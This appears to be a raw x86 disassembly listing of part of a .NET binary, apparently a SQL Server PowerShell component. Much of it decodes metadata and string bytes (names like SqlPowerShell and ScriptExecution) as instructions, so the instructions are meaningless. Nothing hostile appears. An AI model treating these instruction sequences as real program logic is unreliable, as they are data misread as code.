  403bbf:	add    BYTE PTR [esi],cl
  403bc1:	add    BYTE PTR [eax+eax*1],bl
  403bc4:	and    DWORD PTR [ecx],eax
  403bc6:	push   cs
  403bc7:	add    BYTE PTR [eax],ah
  403bc9:	add    BYTE PTR [esi+0x1],bl
  403bcc:	push   cs
  403bcd:	add    BYTE PTR [eax+eax*1],ah
  403bd0:	add    DWORD PTR [ecx],0xe
  403bd3:	add    BYTE PTR [eax],ch
  403bd5:	add    BYTE PTR [ecx+eax*1+0x34000e],ch
  403bdc:	jmp    0x403bdf
  403bde:	or     BYTE PTR [eax],al
  403be0:	cmp    BYTE PTR [eax],al
  403be2:	inc    DWORD PTR [ecx]
  403be4:	or     BYTE PTR [eax],al
  403be6:	cmp    al,0x0
  403be8:	add    al,0x2
  403bea:	or     BYTE PTR [eax],al
  403bec:	inc    eax
  403bed:	add    BYTE PTR [ecx],cl
  403bef:	add    cl,BYTE PTR [eax]
  403bf1:	add    BYTE PTR [eax+eax*1+0x4],al
  403bf5:	add    cl,BYTE PTR [esi]
  403bf7:	add    BYTE PTR [eax+0x0],cl
  403bfa:	push   cs
  403bfb:	add    cl,BYTE PTR [esi]
  403bfd:	add    BYTE PTR [eax+eax*1+0x17],cl
  403c01:	add    cl,BYTE PTR [esi]
  403c03:	add    BYTE PTR [eax+0x0],dl
  403c06:	inc    eax
  403c07:	add    cl,BYTE PTR [esi]
  403c09:	add    BYTE PTR [eax+eax*1-0x26],dl
  403c0d:	add    cl,BYTE PTR [esi]
  403c0f:	add    BYTE PTR [eax+0x0],bl
  403c12:	stc    
  403c13:	add    cl,BYTE PTR [esi]
  403c15:	add    BYTE PTR [eax+eax*1-0x26],bl
  403c19:	add    cl,BYTE PTR [esi]
  403c1b:	add    BYTE PTR [eax+0x0],ah
  403c1e:	sub    al,0x3
  403c20:	push   cs
  403c21:	add    BYTE PTR [eax+eax*1+0x2c],ah
  403c25:	add    ecx,DWORD PTR [esi]
  403c27:	add    BYTE PTR [eax+0x0],ch
  403c2a:	xor    eax,DWORD PTR [ebx]
  403c2c:	push   cs
  403c2d:	add    BYTE PTR [eax+eax*1+0x3e],ch
  403c31:	add    ecx,DWORD PTR [esi]
  403c33:	add    BYTE PTR [eax+0x0],dh
  403c36:	jno    0x403c3b
  403c38:	push   cs
  403c39:	add    BYTE PTR [eax+eax*1+0x71],dh
  403c3d:	add    ecx,DWORD PTR [esi]
  403c3f:	add    BYTE PTR [eax+0x0],bh
  403c42:	mov    WORD PTR [ebx],es
  403c44:	push   cs
  403c45:	add    BYTE PTR [eax+eax*1-0x2b],bh
  403c49:	add    ecx,DWORD PTR [esi]
  403c4b:	add    BYTE PTR [eax+0xe042200],al
  403c51:	add    BYTE PTR [eax+eax*1+0xe0431],al
  403c58:	mov    BYTE PTR [eax],al
  403c5a:	inc    eax
  403c5b:	add    al,0xe
  403c5d:	add    BYTE PTR [eax+eax*1+0xe044d],cl
  403c64:	nop
  403c65:	add    bl,ch
  403c67:	add    DWORD PTR [ecx],ecx
  403c69:	add    BYTE PTR [eax+eax*1+0x9045d],dl
  403c70:	cwde   
  403c71:	add    BYTE PTR [edx+eax*1],al
  403c74:	push   cs
  403c75:	add    BYTE PTR [eax+eax*1+0xe0462],bl
  403c7c:	mov    al,ds:0xe047500
  403c81:	add    BYTE PTR [eax+eax*1+0xe0494],ah
  403c88:	test   al,0x0
  403c8a:	xor    al,BYTE PTR ds:0xac000e
  403c90:	pop    ebp
  403c91:	add    eax,0x9b0020
  403c96:	and    eax,DWORD PTR [esi]
  403c98:	add    BYTE PTR cs:[ebx+0x0],al
  403c9c:	(bad)
  403ca0:	dec    ebx
  403ca1:	add    ch,al
  403ca3:	or     BYTE PTR [esi],ch
  403ca5:	add    BYTE PTR [ebx+0x2e096d00],dl
  403cab:	add    BYTE PTR [ebx],bl
  403cad:	add    cl,dh
  403caf:	pop    es
  403cb0:	add    BYTE PTR cs:[ebx],ah
  403cb3:	add    BYTE PTR [ebx],cl
  403cb5:	or     BYTE PTR [esi],ch
  403cb7:	add    BYTE PTR [ebx],ch
  403cb9:	add    BYTE PTR ds:0x33002e08,dh
  403cbf:	add    BYTE PTR [eax+0x8],dl
  403cc2:	add    BYTE PTR cs:[ebx],bh
  403cc5:	add    BYTE PTR [ebp+0x8],bh
  403cc8:	add    BYTE PTR cs:[ebx+0x0],ah
  403ccc:	or     DWORD PTR ds:[esi],ebp
  403ccf:	add    BYTE PTR [ebx+0x2e096400],cl
  403cd5:	add    BYTE PTR [ebx+0x0],dl
  403cd8:	retf   
  403cd9:	or     BYTE PTR [esi],ch
  403cdb:	add    BYTE PTR [ebx+0x0],bl
  403cde:	sbb    DWORD PTR [ecx],ecx
  403ce0:	add    BYTE PTR cs:[ebx],cl
  403ce3:	add    bl,ch
  403ce5:	pop    es
  403ce6:	add    BYTE PTR cs:[ebx+0x0],dh
  403cea:	pop    ecx
  403ceb:	or     DWORD PTR [esi],ebp
  403ced:	add    BYTE PTR [ebx+0x0],bh
  403cf0:	jmp    0x403cf9
  403cf2:	add    BYTE PTR cs:[ebx+0x63062300],al
  403cf9:	add    bl,cl
  403cfb:	add    cl,al
  403cfd:	pop    es
  403cfe:	add    DWORD PTR [eax],0xffffffcb
  403d01:	add    cl,al
  403d03:	pop    es
  403d04:	int3   
  403d05:	push   es
  403d06:	push   edx
  403d07:	add    BYTE PTR [ebp-0x41f853f9],al
  403d0d:	pop    es
  403d0e:	aam    0x7
  403d10:	add    eax,DWORD PTR [eax]
  403d12:	add    DWORD PTR [eax],eax
  403d14:	add    al,0x0
  403d16:	or     al,BYTE PTR [eax]
  403d18:	add    eax,0xb00
  403d1d:	add    BYTE PTR [edx+eax*1+0x49],dl
  403d21:	add    BYTE PTR [eax],al
  403d23:	add    BYTE PTR [edx+eax*1+0x4e],bl
  403d27:	add    BYTE PTR [eax],al
  403d29:	add    BYTE PTR [ebp+0x2],ch
  403d2c:	dec    esi
  403d2d:	add    BYTE PTR [eax],al
  403d2f:	add    BYTE PTR [edx+eax*1+0x4e],dh
  403d33:	add    BYTE PTR [eax],al
  403d35:	add    BYTE PTR [ecx+0x2],bh
  403d38:	dec    esi
  403d39:	add    BYTE PTR [eax],al
  403d3b:	add    BYTE PTR [edx+eax*1+0x4e],cl
  403d42:	stos   DWORD PTR es:[edi],eax
  403d43:	add    cl,BYTE PTR [esi+0x0]
  403d46:	add    BYTE PTR [eax],al
  403d48:	mov    esi,0x4e02
  403d4d:	add    bl,dl
  403d4f:	add    cl,BYTE PTR [esi+0x0]
  403d52:	add    BYTE PTR [eax],al
  403d54:	push   esp
  403d55:	add    cl,BYTE PTR [ecx+0x0]
  403d58:	add    BYTE PTR [eax],al
  403d5a:	jmp    0x700:0x2004e05
  403d61:	add    BYTE PTR [ebx],al
  403d63:	add    BYTE PTR [ecx],al
  403d65:	add    BYTE PTR [eax],cl
  403d67:	add    BYTE PTR [ebx],al
  403d69:	add    BYTE PTR [edx],al
  403d6b:	add    BYTE PTR [ecx],cl
  403d6d:	add    BYTE PTR ds:0xa000200,al
  403d73:	add    BYTE PTR [edi],al
  403d75:	add    BYTE PTR [edx],al
  403d77:	add    BYTE PTR [ebx],cl
  403d79:	add    BYTE PTR [ecx],cl
  403d7b:	add    BYTE PTR [edx],al
  403d7d:	add    BYTE PTR [eax+eax*1],cl
  403d80:	or     eax,DWORD PTR [eax]
  403d82:	add    al,BYTE PTR [eax]
  403d84:	or     eax,0x2000d00
  403d89:	add    BYTE PTR [esi],cl
  403d8b:	add    BYTE PTR [edi],cl
  403d8d:	add    BYTE PTR [edx],al
  403d8f:	add    BYTE PTR [edi],cl
  403d91:	add    BYTE PTR [ecx],dl
  403d93:	add    BYTE PTR [edx],al
  403d95:	add    BYTE PTR [eax],dl
  403d97:	add    BYTE PTR [ebx],dl
  403d99:	add    BYTE PTR [edx],al
  403d9b:	add    BYTE PTR [eax+eax*1],dl
  403d9e:	adc    eax,0x15000100
  403da3:	add    BYTE PTR ds:0x1a000200,dl
  403da9:	add    BYTE PTR [edi],dl
  403dab:	add    BYTE PTR [eax+0x6],bh
  403dae:	mov    dh,0x6
  403db0:	mov    edx,0x1506be06
  403db5:	pop    es
  403db6:	sub    BYTE PTR [edi],al
  403db8:	push   ecx
  403db9:	pop    es
  403dba:	arpl   WORD PTR [edi],ax
  403dbc:	add    al,0x80
  403dbe:	add    BYTE PTR [eax],al
  403dc0:	or     eax,DWORD PTR [eax]
  403dc2:	add    BYTE PTR [eax],al
  403dc4:	add    BYTE PTR [eax],al
  403dc6:	add    BYTE PTR [eax],al
  403dc8:	add    DWORD PTR [eax],eax
  403dca:	add    BYTE PTR [eax],al
  403dcc:	jnp    0x403dd3
  403dce:	scas   al,BYTE PTR es:[edi]
  403dcf:	or     BYTE PTR [eax],al
  403dd1:	add    BYTE PTR [edx],al
	...
  403ddb:	add    BYTE PTR [eax],al
  403ddd:	add    BYTE PTR [ecx],al
  403ddf:	add    BYTE PTR [ecx+0x0],bh
  403de2:	add    BYTE PTR [eax],al
  403de4:	add    BYTE PTR [eax],al
  403de6:	add    DWORD PTR [eax],eax
	...
  403df0:	add    BYTE PTR [eax],al
  403df2:	adc    BYTE PTR [eax],al
  403df4:	xchg   ebp,eax
  403df5:	add    BYTE PTR [eax],al
  403df7:	add    BYTE PTR [eax],al
  403df9:	add    BYTE PTR [ecx],al
	...
  403e03:	add    BYTE PTR [eax],al
  403e05:	add    BYTE PTR [eax],dl
  403e07:	add    BYTE PTR [edx+0xb],dl
	...
  403e12:	add    DWORD PTR [eax],eax
  403e14:	add    BYTE PTR [eax],al
  403e16:	iret   
  403e17:	push   cs
  403e18:	add    BYTE PTR [eax],al
  403e1a:	add    BYTE PTR [eax],al
  403e1c:	add    BYTE PTR [ecx*2+0x6c75646f],bh
  403e23:	gs add BYTE PTR ds:[ebx+0x51],dl
  403e28:	dec    esp
  403e29:	push   eax
  403e2a:	push   ebx
  403e2b:	cs gs js 0x403e94
  403e2f:	add    BYTE PTR [ebx+0x71],dl
  403e32:	ins    BYTE PTR es:[edi],dx
  403e33:	push   eax
  403e34:	outs   dx,DWORD PTR ds:[esi]
  403e35:	ja     0x403e9c
  403e37:	jb     0x403e8c
  403e39:	push   0x6c6c65
  403e3e:	dec    ebp
  403e3f:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403e46:	je     0x403e76
  403e48:	push   ebx
  403e49:	jno    0x403eb7
  403e4b:	push   ebx
  403e4c:	gs jb  0x403ec5
  403e4f:	gs jb  0x403e80
  403e52:	dec    ebp
  403e53:	popa   
  403e54:	outs   dx,BYTE PTR ds:[esi]
  403e55:	popa   
  403e56:	gs ins DWORD PTR es:[di],dx
  403e59:	outs   dx,BYTE PTR gs:[esi]
  403e5b:	je     0x403e8b
  403e5d:	push   eax
  403e5e:	outs   dx,DWORD PTR ds:[esi]
  403e5f:	ja     0x403ec6
  403e61:	jb     0x403eb6
  403e63:	push   0x6c6c65
  403e68:	inc    ebp
  403e69:	js     0x403ece
  403e6b:	gs jo  0x403ee2
  403e6e:	imul   ebp,DWORD PTR [edi+0x6e],0x706d6554
  403e75:	ins    BYTE PTR es:[edi],dx
  403e76:	popa   
  403e77:	je     0x403ede
  403e79:	jae    0x403ece
  403e7b:	push   edx
  403e7c:	add    BYTE PTR [edx+0x65],dl
  403e7f:	jae    0x403e81
  403e81:	inc    ecx
  403e82:	jae    0x403ef7
  403e84:	gs ins DWORD PTR es:[edi],dx
  403e86:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  403e8a:	gs jb  0x403f00
  403e8d:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  403e94:	add    BYTE PTR [ebp+0x73],ch
  403e97:	arpl   WORD PTR [edi+0x72],bp
  403e9a:	ins    BYTE PTR es:[edi],dx
  403e9b:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  403ea2:	gs ins DWORD PTR es:[edi],dx
  403ea4:	add    BYTE PTR [edi+0x62],cl
  403ea7:	push   0x65
  403ea9:	arpl   WORD PTR [eax+eax*1+0x4d],si
  403ead:	popa   
  403eae:	imul   ebp,DWORD PTR [esi+0x0],0x74737953
  403eb5:	gs ins DWORD PTR es:[edi],dx
  403eb7:	cs dec ebp
  403eb9:	popa   
  403eba:	outs   dx,BYTE PTR ds:[esi]
  403ebb:	popa   
  403ebc:	gs ins DWORD PTR es:[di],dx
  403ebf:	outs   dx,BYTE PTR gs:[esi]
  403ec1:	je     0x403ef1
  403ec3:	inc    ecx
  403ec4:	jne    0x403f3a
  403ec6:	outs   dx,DWORD PTR ds:[esi]
  403ec7:	ins    DWORD PTR es:[edi],dx
  403ec8:	popa   
  403ec9:	je     0x403f34
  403ecb:	outs   dx,DWORD PTR ds:[esi]
  403ecc:	outs   dx,BYTE PTR ds:[esi]
  403ecd:	add    BYTE PTR [ebx+0x79],dl
  403ed0:	jae    0x403f46
  403ed2:	gs ins DWORD PTR es:[edi],dx
  403ed4:	cs dec ebp
  403ed6:	popa   
  403ed7:	outs   dx,BYTE PTR ds:[esi]
  403ed8:	popa   
  403ed9:	gs ins DWORD PTR es:[di],dx
  403edc:	outs   dx,BYTE PTR gs:[esi]
  403ede:	je     0x403f0e
  403ee0:	inc    ecx
  403ee1:	jne    0x403f57
  403ee3:	outs   dx,DWORD PTR ds:[esi]
  403ee4:	ins    DWORD PTR es:[edi],dx
  403ee5:	popa   
  403ee6:	je     0x403f51
  403ee8:	outs   dx,DWORD PTR ds:[esi]
  403ee9:	outs   dx,BYTE PTR ds:[esi]
  403eea:	cs push edx
  403eec:	jne    0x403f5c
  403eee:	jae    0x403f60
  403ef0:	popa   
  403ef1:	arpl   WORD PTR [ebp+0x73],sp
  403ef4:	add    BYTE PTR [edx+0x75],dl
  403ef7:	outs   dx,BYTE PTR ds:[esi]
  403ef8:	jae    0x403f6a
  403efa:	popa   
  403efb:	arpl   WORD PTR [ebp+0x43],sp
  403efe:	outs   dx,DWORD PTR ds:[esi]
  403eff:	outs   dx,BYTE PTR ds:[esi]
  403f00:	imul   sp,WORD PTR [edi+0x75],0x6172
  403f06:	je     0x403f71
  403f08:	outs   dx,DWORD PTR ds:[esi]
  403f09:	outs   dx,BYTE PTR ds:[esi]
  403f0a:	add    BYTE PTR [eax+0x61],cl
  403f0d:	outs   dx,BYTE PTR ds:[esi]
  403f0e:	fs ins BYTE PTR es:[edi],dx
  403f10:	gs inc ecx
  403f12:	outs   dx,BYTE PTR gs:[si]
  403f15:	je     0x403f61
  403f17:	outs   dx,DWORD PTR ds:[esi]
  403f18:	bound  eax,QWORD PTR [eax]
  403f1a:	inc    edi
  403f1b:	gs je  0x403f63
  403f1e:	jb     0x403f92
  403f20:	outs   dx,DWORD PTR ds:[esi]
  403f21:	jb     0x403f70
  403f23:	gs jae 0x403f99
  403f26:	popa   
  403f27:	add    BYTE PTR gs:[di+0x72],al
  403f2c:	jb     0x403f9d
  403f2e:	jb     0x403f82
  403f30:	arpl   WORD PTR gs:[edi+0x72],bp
  403f34:	add    BYTE PTR fs:[edi+0x65],al
  403f38:	je     0x403f7f
  403f3a:	jb     0x403fae
  403f3c:	outs   dx,DWORD PTR ds:[esi]
  403f3d:	jb     0x403f91
  403f3f:	arpl   WORD PTR gs:[edi+0x72],bp
  403f43:	fs dec ebp
  403f45:	gs jae 0x403fbb
  403f48:	popa   
  403f49:	add    BYTE PTR gs:0x7463,ch
  403f4f:	outs   dx,DWORD PTR ds:[esi]
  403f50:	jb     0x403f52
  403f52:	push   ebx
  403f53:	jns    0x403fc8
  403f55:	je     0x403fbc
  403f57:	ins    DWORD PTR es:[edi],dx
  403f58:	cs inc edi
  403f5a:	ins    BYTE PTR es:[edi],dx
  403f5b:	outs   dx,DWORD PTR ds:[esi]
  403f5c:	bound  esp,QWORD PTR [ecx+0x6c]
  403f5f:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  403f66:	add    BYTE PTR [ebx+0x75],al
  403f69:	ins    BYTE PTR es:[edi],dx
  403f6a:	je     0x403fe1
  403f6c:	jb     0x403fd3
  403f6e:	dec    ecx
  403f6f:	outs   dx,BYTE PTR ds:[esi]
  403f70:	outs   dx,WORD PTR ds:[esi]
  403f72:	add    BYTE PTR [edi+0x65],ah
  403f75:	je     0x403fd6
  403f77:	inc    ebx
  403f78:	jne    0x403fe6
  403f7a:	je     0x403ff1
  403f7c:	jb     0x403fe3
  403f7e:	add    BYTE PTR [ebx+0x65],dh
  403f81:	je     0x403fe2
  403f83:	inc    ebx
  403f84:	jne    0x403ff2
  403f86:	je     0x403ffd
  403f88:	jb     0x403fef
  403f8a:	add    BYTE PTR [edi+0x65],ah
  403f8d:	je     0x403fee
  403f8f:	inc    ebx
  403f90:	popa   
  403f91:	outs   dx,BYTE PTR ds:[esi]
  403f92:	outs   dx,BYTE PTR ds:[esi]
  403f93:	outs   dx,DWORD PTR ds:[esi]
  403f94:	je     0x403fdf
  403f96:	outs   dx,BYTE PTR ds:[esi]
  403f97:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  403f9f:	add    BYTE PTR [edi+0x65],ah
  403fa2:	je     0x404003
  403fa4:	inc    edx
  403fa5:	popa   
  403fa6:	outs   dx,BYTE PTR ds:[esi]
  403fa7:	outs   dx,BYTE PTR ds:[esi]
  403fa8:	gs jb  0x403fab
  403fab:	addr16 gs je 0x40400e
  403faf:	dec    eax
  403fb0:	gs ins BYTE PTR es:[edi],dx
  403fb2:	jo     0x403fb4
  403fb4:	addr16 gs je 0x404017
  403fb8:	inc    ebp
  403fb9:	jb     0x40402d
  403fbb:	outs   dx,DWORD PTR ds:[esi]
  403fbc:	jb     0x404010
  403fbe:	gs popa 
  403fc0:	imul   ebp,DWORD PTR fs:[esi+0x67],0x69726353
  403fc8:	jo     0x40403e
  403fca:	add    BYTE PTR [edi+0x65],ah
  403fcd:	je     0x40402e
  403fcf:	inc    ebp
  403fd0:	jb     0x404044
  403fd2:	outs   dx,DWORD PTR ds:[esi]
  403fd3:	jb     0x404016
  403fd5:	ins    BYTE PTR es:[edi],dx
  403fd6:	ins    BYTE PTR es:[edi],dx
  403fd7:	outs   dx,DWORD PTR ds:[esi]
  403fd8:	arpl   WORD PTR [ecx+0x74],sp
  403fdb:	imul   ebp,DWORD PTR [esi+0x67],0x6f6d654d
  403fe2:	jb     0x40405d
  403fe4:	inc    esi
  403fe5:	outs   dx,DWORD PTR ds:[esi]
  403fe6:	jb     0x40403b
  403fe8:	arpl   WORD PTR [edx+0x69],si
  403feb:	jo     0x404061
  403fed:	add    BYTE PTR [edi+0x65],ah
  403ff0:	je     0x404051
  403ff2:	inc    ebp
  403ff3:	ins    DWORD PTR es:[edi],dx
  403ff4:	jo     0x40406a
  403ff6:	jns    0x40404b
  403ff8:	arpl   WORD PTR [edx+0x69],si
  403ffb:	jo     0x404071
  403ffd:	dec    ebp
  403ffe:	gs jae 0x404074
  404001:	popa   
  404002:	add    BYTE PTR gs:[bx+0x65],ah
  404007:	je     0x404068
  404009:	inc    ebp
  40400a:	ins    DWORD PTR es:[edi],dx
  40400b:	jo     0x404081
  40400d:	jns    0x40405f
  40400f:	imul   esi,DWORD PTR [eax+0x65],0x656e696c
  404016:	push   edx
  404017:	gs jae 0x40408f
  40401a:	ins    BYTE PTR es:[edi],dx
  40401b:	je     0x404090
  40401d:	add    BYTE PTR [edi+0x65],ah
  404020:	je     0x404081
  404022:	dec    esi
  404023:	outs   dx,DWORD PTR ds:[esi]
  404024:	outs   dx,BYTE PTR ds:[esi]
  404025:	push   esp
  404026:	gs jb  0x404096
  404029:	imul   ebp,DWORD PTR [esi+0x61],0x676e6974
  404030:	inc    ebp
  404031:	jb     0x4040a5
  404033:	outs   dx,DWORD PTR ds:[esi]
  404034:	jb     0x4040a9
  404036:	add    BYTE PTR [ebx+0x63],dl
  404039:	jb     0x4040a4
  40403b:	jo     0x4040b1
  40403d:	inc    ebp
  40403e:	js     0x4040a5
  404040:	arpl   WORD PTR [ebp+0x74],si
  404043:	imul   ebp,DWORD PTR [edi+0x6e],0x65637845
  40404a:	jo     0x4040c0
  40404c:	imul   ebp,DWORD PTR [edi+0x6e],0x6b6e5500
  404053:	outs   dx,BYTE PTR ds:[esi]
  404054:	outs   dx,DWORD PTR ds:[esi]
  404055:	ja     0x4040c5
  404057:	push   ebx
  404058:	arpl   WORD PTR [edx+0x69],si
  40405b:	jo     0x4040d1
  40405d:	inc    ebp
  40405e:	js     0x4040c5
  404060:	arpl   WORD PTR [ebp+0x74],si
  404063:	imul   ebp,DWORD PTR [edi+0x6e],0x65637845
  40406a:	jo     0x4040e0
  40406c:	imul   ebp,DWORD PTR [edi+0x6e],0x6c754300
  404073:	je     0x4040ea
  404075:	jb     0x4040dc
  404077:	add    BYTE PTR [ebx+0x61],al
  40407a:	outs   dx,BYTE PTR ds:[esi]
  40407b:	outs   dx,BYTE PTR ds:[esi]
  40407c:	outs   dx,DWORD PTR ds:[esi]
  40407d:	je     0x4040c8
  40407f:	outs   dx,BYTE PTR ds:[esi]
  404080:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  404088:	add    BYTE PTR [edx+0x61],al
  40408b:	outs   dx,BYTE PTR ds:[esi]
  40408c:	outs   dx,BYTE PTR ds:[esi]
  40408d:	gs jb  0x404090
  404090:	dec    eax
  404091:	gs ins BYTE PTR es:[edi],dx
  404093:	jo     0x404095
  404095:	inc    ebp
  404096:	jb     0x40410a
  404098:	outs   dx,DWORD PTR ds:[esi]
  404099:	jb     0x4040ed
  40409b:	gs popa 
  40409d:	imul   ebp,DWORD PTR fs:[esi+0x67],0x69726353
  4040a5:	jo     0x40411b
  4040a7:	add    BYTE PTR [ebp+0x72],al
  4040aa:	jb     0x40411b
  4040ac:	jb     0x4040ef
  4040ae:	ins    BYTE PTR es:[edi],dx
  4040af:	ins    BYTE PTR es:[edi],dx
  4040b0:	outs   dx,DWORD PTR ds:[esi]
  4040b1:	arpl   WORD PTR [ecx+0x74],sp
  4040b4:	imul   ebp,DWORD PTR [esi+0x67],0x6f6d654d
  4040bb:	jb     0x404136
  4040bd:	inc    esi
  4040be:	outs   dx,DWORD PTR ds:[esi]
  4040bf:	jb     0x404114
  4040c1:	arpl   WORD PTR [edx+0x69],si
  4040c4:	jo     0x40413a
  4040c6:	add    BYTE PTR [ebp+0x6d],al
  4040c9:	jo     0x40413f
  4040cb:	jns    0x404120
  4040cd:	arpl   WORD PTR [edx+0x69],si
  4040d0:	jo     0x404146
  4040d2:	dec    ebp
  4040d3:	gs jae 0x404149
  4040d6:	popa   
  4040d7:	add    BYTE PTR gs:[di+0x6d],al
  4040dc:	jo     0x404152
  4040de:	jns    0x404130
  4040e0:	imul   esi,DWORD PTR [eax+0x65],0x656e696c
  4040e7:	push   edx
  4040e8:	gs jae 0x404160
  4040eb:	ins    BYTE PTR es:[edi],dx
  4040ec:	je     0x404161
  4040ee:	add    BYTE PTR [esi+0x6f],cl
  4040f1:	outs   dx,BYTE PTR ds:[esi]
  4040f2:	push   esp
  4040f3:	gs jb  0x404163
  4040f6:	imul   ebp,DWORD PTR [esi+0x61],0x676e6974
  4040fd:	inc    ebp
  4040fe:	jb     0x404172
  404100:	outs   dx,DWORD PTR ds:[esi]
  404101:	jb     0x404176
  404103:	add    BYTE PTR [ebx+0x79],dl
  404106:	jae    0x40417c
  404108:	gs ins DWORD PTR es:[edi],dx
  40410a:	cs push edx
  40410c:	gs jae 0x40417e
  40410f:	jne    0x404183
  404111:	arpl   WORD PTR [ebp+0x73],sp
  404114:	add    BYTE PTR [edx+0x65],dl
  404117:	jae    0x404188
  404119:	jne    0x40418d
  40411b:	arpl   WORD PTR [ebp+0x4d],sp
  40411e:	popa   
  40411f:	outs   dx,BYTE PTR ds:[esi]
  404120:	popa   
  404121:	addr16 gs jb 0x404125
  404125:	jb     0x40418c
  404127:	jae    0x404198
  404129:	jne    0x40419d
  40412b:	arpl   WORD PTR [ebp+0x4d],sp
  40412e:	popa   
  40412f:	outs   dx,BYTE PTR ds:[esi]
  404130:	popa   
  404131:	addr16 gs jb 0x404135
  404135:	pop    edi
  404136:	arpl   WORD PTR [ebp+0x6c],si
  404139:	je     0x4041b0
  40413b:	jb     0x4041a2
  40413d:	add    BYTE PTR [edi+0x65],al
  404140:	je     0x404195
  404142:	je     0x4041b6
  404144:	imul   ebp,DWORD PTR [esi+0x67],0x72655600
  40414b:	jae    0x4041b6
  40414d:	outs   dx,DWORD PTR ds:[esi]
  40414e:	outs   dx,BYTE PTR ds:[esi]
  40414f:	push   ebx
  404150:	je     0x4041c4
  404152:	imul   ebp,DWORD PTR [esi+0x67],0x6a614d00
  404159:	outs   dx,DWORD PTR ds:[esi]
  40415a:	jb     0x4041b2
  40415c:	gs jb  0x4041d2
  40415f:	imul   ebp,DWORD PTR [edi+0x6e],0x6e694d00
  404166:	outs   dx,DWORD PTR ds:[esi]
  404167:	jb     0x4041bf
  404169:	gs jb  0x4041df
  40416c:	imul   ebp,DWORD PTR [edi+0x6e],0x69754200
  404173:	ins    BYTE PTR es:[edi],dx
  404174:	fs push esi
  404176:	gs jb  0x4041ec
  404179:	imul   ebp,DWORD PTR [edi+0x6e],0x4c505300
  404180:	gs jbe 0x4041e8
  404183:	ins    BYTE PTR es:[edi],dx
  404184:	add    BYTE PTR [eax+0x72],dl
  404187:	outs   dx,DWORD PTR ds:[esi]
  404188:	fs jne 0x4041ee
  40418b:	je     0x4041e3
  40418d:	gs jb  0x404203
  404190:	imul   ebp,DWORD PTR [edi+0x6e],0x69727453
  404197:	outs   dx,BYTE PTR ds:[esi]
  404198:	add    BYTE PTR [bx+si+0x72],dl
  40419c:	outs   dx,DWORD PTR ds:[esi]
  40419d:	fs jne 0x404203
  4041a0:	je     0x4041f0
  4041a2:	popa   
  4041a3:	ins    DWORD PTR es:[edi],dx
  4041a4:	gs push ebx
  4041a6:	je     0x40421a
  4041a8:	imul   ebp,DWORD PTR [esi+0x67],0x6c715300
  4041af:	inc    ebp
  4041b0:	outs   dx,BYTE PTR ds:[esi]
  4041b1:	imul   ebp,DWORD PTR [bp+0x65],0x67617355
  4041b9:	gs dec ebp
  4041bb:	gs je  0x404230
  4041be:	imul   esp,DWORD PTR [ebx+0x73],0x656c6f52
  4041c5:	inc    edi
  4041c6:	jne    0x404231
  4041c8:	fs push ebx
  4041ca:	je     0x40423e
  4041cc:	imul   ebp,DWORD PTR [esi+0x67],0x6f725000
  4041d3:	fs jne 0x404239
  4041d6:	je     0x404226
  4041d8:	popa   
  4041d9:	ins    DWORD PTR es:[edi],dx
  4041da:	gs inc edx
  4041dc:	jb     0x40423f
  4041de:	outs   dx,BYTE PTR ds:[esi]
  4041df:	imul   ebp,DWORD PTR fs:[esi+0x67],0x69727453
  4041e7:	outs   dx,BYTE PTR ds:[esi]
  4041e8:	add    BYTE PTR [si+0x6f],cl
  4041ec:	outs   dx,BYTE PTR ds:[esi]
  4041ed:	addr16 push eax
  4041ef:	jb     0x404260
  4041f1:	fs jne 0x404257
  4041f4:	je     0x404244
  4041f6:	popa   
  4041f7:	ins    DWORD PTR es:[edi],dx
  4041f8:	gs inc edx
  4041fa:	jb     0x40425d
  4041fc:	outs   dx,BYTE PTR ds:[esi]
  4041fd:	imul   ebp,DWORD PTR fs:[esi+0x67],0x69727453
  404205:	outs   dx,BYTE PTR ds:[esi]
  404206:	add    BYTE PTR [bx+si+0x72],dl
  40420a:	outs   dx,DWORD PTR ds:[esi]
  40420b:	fs jne 0x404271
  40420e:	je     0x40425e
  404210:	popa   
  404211:	ins    DWORD PTR es:[edi],dx
  404212:	gs push ebx
  404214:	push   0x6374726f
  404219:	jne    0x40428f
  40421b:	inc    edx
  40421c:	jb     0x40427f
  40421e:	outs   dx,BYTE PTR ds:[esi]
  40421f:	imul   ebp,DWORD PTR fs:[esi+0x67],0x69727453
  404227:	outs   dx,BYTE PTR ds:[esi]
  404228:	add    BYTE PTR [bp+0x65],dl
  40422c:	jb     0x4042a1
  40422e:	imul   ebp,DWORD PTR [edi+0x6e],0x61636f4c
  404235:	je     0x4042a0
  404237:	outs   dx,DWORD PTR ds:[esi]
  404238:	outs   dx,BYTE PTR ds:[esi]
  404239:	push   ebx
  40423a:	je     0x4042ae
  40423c:	imul   ebp,DWORD PTR [esi+0x67],0x6f725000
  404243:	fs jne 0x4042a9
  404246:	je     0x40429e
  404248:	gs jb  0x4042be
  40424b:	imul   ebp,DWORD PTR [edi+0x6e],0x61636f4c
  404252:	je     0x4042bd
  404254:	outs   dx,DWORD PTR ds:[esi]
  404255:	outs   dx,BYTE PTR ds:[esi]
  404256:	push   ebx
  404257:	je     0x4042cb
  404259:	imul   ebp,DWORD PTR [esi+0x67],0x72655600
  404260:	jae    0x4042cb
  404262:	outs   dx,DWORD PTR ds:[esi]
  404263:	outs   dx,BYTE PTR ds:[esi]
  404264:	dec    eax
  404265:	gs ins BYTE PTR es:[edi],dx
  404267:	jo     0x4042b4
  404269:	gs jns 0x4042e3
  40426c:	outs   dx,DWORD PTR ds:[esi]
  40426d:	jb     0x4042d3
  40426f:	push   eax
  404270:	jb     0x4042d7
  404272:	imul   di,WORD PTR [eax+0x0],0x6556
  404278:	jb     0x4042ed
  40427a:	imul   ebp,DWORD PTR [edi+0x6e],0x706c6548
  404281:	push   ebx
  404282:	gs je  0x4042f9
  404285:	imul   ebp,DWORD PTR [esi+0x67],0x6b6f5473
  40428c:	outs   dx,BYTE PTR gs:[esi]
  40428e:	add    BYTE PTR [ebx+0x65],dl
  404291:	je     0x404308
  404293:	jo     0x4042e8
  404295:	jne    0x404307
  404297:	jo     0x404308
  404299:	jb     0x40430f
  40429b:	inc    esi
  40429c:	outs   dx,DWORD PTR ds:[esi]
